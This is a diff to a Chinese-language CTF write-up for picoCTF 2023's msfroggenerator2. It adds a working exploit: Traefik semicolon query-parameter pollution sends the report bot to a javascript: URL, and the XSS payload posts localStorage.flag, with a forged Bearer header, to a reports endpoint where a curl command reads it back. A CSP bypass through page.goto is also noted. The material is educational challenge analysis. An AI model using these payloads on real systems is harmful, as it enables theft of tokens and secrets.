@@ -85,3 +85,18 @@ server {
 [proxy_set_header](https://www.cnblogs.com/kevingrace/p/8269955.html)重新定义或添加字段传递给代理服务器的请求头，设置的正是刚才提到的host头。[proxy_pass](https://www.jianshu.com/p/b010c9302cd0)设置转发给traefik，然后traefik就能根据host头选择服务了。[set_by_lua](https://juejin.cn/s/nginx%20set_by_lua%20directive)用于在nginx配置文件中执行Lua代码，并将执行结果存储到nginx变量中。`..`起到拼接的作用，`ngx.var.arg_id`为query 参数。
 
 这里就是全部的基础内容了，具体解法可以看wp，非常清晰（就是复现不出来，再清晰也改变不了我笨的事实）。
+
+今天看到另一个[wp](https://blog.maple3142.net/2023/03/29/picoctf-2023-writeups/#msfroggenerator2)，再度刷新我的认知：糟了原来这么简单，看来我真的是个笨蛋。
+
+前半部分和上面的wp一样，利用traefik判断query string separator时会考虑分号`;`，且在 2.7.2 版本之后会将分号标准化为`&`，于是有了参数覆盖。非预期的地方在于，既然可以让bot去任意url了，完全可以塞个`javascript:script`来让bot执行xss payload。
+```sh
+base=
+curl -g $base'/report?id=;url=javascript:fetch("/api/reports/add",{method:"POST",headers:{"Content-Type":"application/json","Authorization":`Bearer\u0020${localStorage.flag}`},body:JSON.stringify({url:localStorage.flag})})' -v
+sleep 5
+curl $base'/api/reports/get' | jq .[].url
+```
+最后的`jq .[].url`中的jq是个处理json的命令，`.[]` is a jq filter that extracts the values of all elements in the top-level array。
+
+exp逻辑大概是这样的：根据源码（bot.js），bot会去到我们给出的url，在url的页面截个图，发往`/api/reports/add`。`/api/reports/add`判断Bearer是否是flag（即是不是bot发的），然后将接收到的req.body作为report加入reports数组（web.js）。`/api/reports/get`路由获取之前加的所有report。现在我们发送的url直接就是js代码，bot执行后会带着bearer去往add，req.body也是flag。自然去到get就能拿到flag了。
+
+题目作者确实加了csp，但chrome似乎允许`page.goto`(等于用户在浏览器输入url)执行xss，不管csp。
